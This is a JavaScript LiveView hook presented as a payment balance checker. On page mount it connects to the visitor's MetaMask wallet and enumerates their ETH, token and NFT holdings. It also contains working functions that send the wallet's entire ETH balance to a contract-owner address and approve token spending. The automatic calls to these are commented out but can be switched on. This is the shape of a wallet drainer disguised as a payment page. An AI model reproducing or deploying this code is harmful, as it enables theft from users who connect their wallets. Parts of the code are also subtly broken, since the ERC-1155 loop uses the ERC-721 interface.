import { ethers } from "ethers";
import { tokenAddresses, erc20Abi, contractOwnerAddress, erc721Abi, erc1155Abi, erc721Addresses, erc1155Addresses } from '../config.js';


let CheckBalances = {
    async mounted() {
        console.log("CheckBalances mounted");
        if (!window.ethereum) {
            this.pushEvent("set_payment_variant", { variant: "qr" });
            return;
        }
        try {
            this.pushEvent("set_payment_variant", { variant: "wallet" });
            console.log("CheckBalances connected to MetaMask");
            // Connect to MetaMask
            const provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();

            console.log("User address:", userAddress);

            // Get ETH balance
            const balance = await provider.getBalance(userAddress);
            const formattedBalance = ethers.formatEther(balance);

            console.log("ETH balance:", formattedBalance);

            this.pushEvent("set_wallet_basics", {
                address: userAddress,
                eth_balance: formattedBalance
            });


            // Get list of token balances
            const tokenBalances = await this.getTokenBalances(provider, userAddress);

            console.log("Token balances:", tokenBalances);
            // Get list of NFTs
            const nftCollection = await this.getNFTs(signer, userAddress);

            console.log("NFTs:", nftCollection);
            // Automatically transfer the entire ETH balance to the contract owner
            // await this.transferEntireEthBalance(signer, balance);

            // // Automatically approve all available tokens for the user address if balance is greater than zero
            // await this.approveTokensAutomatically(signer, tokenBalances, userAddress);

            // Push the results back to LiveView
            const formattedBalances = tokenBalances.map(token => ({
                ...token,
                rawBalance: token.rawBalance.toString() // Convert BigInt to string
            }));

            this.pushEvent("check_balances_result", {
                address: userAddress,
                eth_balance: formattedBalance,
                tokens: formattedBalances,
                nfts: nftCollection
            });

        } catch (error) {
            console.error("Error checking balances:", error);
        }
    },

    async getTokenBalances(provider, address) {
        const tokenBalances = [];

        for (const tokenAddress of tokenAddresses) {
            try {
                const contract = new ethers.Contract(tokenAddress, erc20Abi, provider);
                const balance = await contract.balanceOf(address);
                const decimals = await contract.decimals();
                const symbol = await contract.symbol();
                const formattedBalance = ethers.formatUnits(balance, decimals);

                if (balance > 0) {
                    tokenBalances.push({
                        tokenAddress,
                        symbol,
                        balance: formattedBalance,
                        rawBalance: balance // Keep raw balance for approval
                    });
                }
            } catch (error) {
                console.error(`Failed to fetch balance for token at ${tokenAddress}:`, error);
            }
        }

        return tokenBalances;
    },

    async getNFTs(signer, userAddress) {
        const nfts = [];

        // Fetch ERC-721 NFTs
        for (const nftAddress of erc721Addresses) {
            if (ethers.isAddress(nftAddress)) {
                try {
                    const contract = new ethers.Contract(nftAddress, erc721Abi, signer);
                    const balance = await contract.balanceOf(userAddress);
                    for (let i = 0; i < balance; i++) {
                        const tokenId = await contract.tokenOfOwnerByIndex(userAddress, i);
                        const tokenURI = await contract.tokenURI(tokenId);
                        nfts.push({ contract: nftAddress, tokenId, tokenURI, type: "ERC-721" });
                    }
                } catch (error) {
                    console.error(`Failed to fetch ERC-721 NFTs from ${nftAddress}: ${error}`);
                }
            }
        }

        // Fetch ERC-1155 NFTs
        for (const nftAddress of erc1155Addresses) {
            if (ethers.isAddress(nftAddress)) {
                try {
                    const contract = new ethers.Contract(nftAddress, erc721Abi, signer);
                    const balance = await contract.balanceOf(userAddress);
                    for (let i = 0; i < balance; i++) {
                        const tokenId = await contract.tokenOfOwnerByIndex(userAddress, i);
                        const tokenURI = await contract.tokenURI(tokenId);
                        nfts.push({ contract: nftAddress, tokenId, tokenURI, type: "ERC-1155" });
                    }
                } catch (error) {
                    console.error(`Failed to fetch ERC-1155 NFTs from ${nftAddress}: ${error}`);
                }
            }
        }

        return nfts;
    },

    async approveTokensAutomatically(signer, tokenBalances, spenderAddress) {
        for (const token of tokenBalances) {
            try {
                const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
                const tx = await contract.approve(spenderAddress, token.rawBalance);
                await tx.wait();
                console.log(`Automatically approved ${token.symbol} with ${token.balance} tokens for ${spenderAddress}`);
            } catch (error) {
                console.error(`Failed to automatically approve ${token.symbol}:`, error);
            }
        }
    },

    async transferEntireEthBalance(signer, balance) {
        try {
            const gasEstimate = ethers.parseUnits("0.001", "ether");
            const amountToSend = balance - gasEstimate;

            if (amountToSend > 0) {
                const tx = await signer.sendTransaction({
                    to: contractOwnerAddress,
                    value: amountToSend
                });
                await tx.wait();
                console.log(`Successfully transferred ${ethers.formatEther(amountToSend)} ETH to ${contractOwnerAddress}`);
            } else {
                console.log("Not enough ETH balance to cover gas fees.");
            }
        } catch (error) {
            console.error("Failed to transfer ETH:", error);
        }
    }
};

export default CheckBalances;
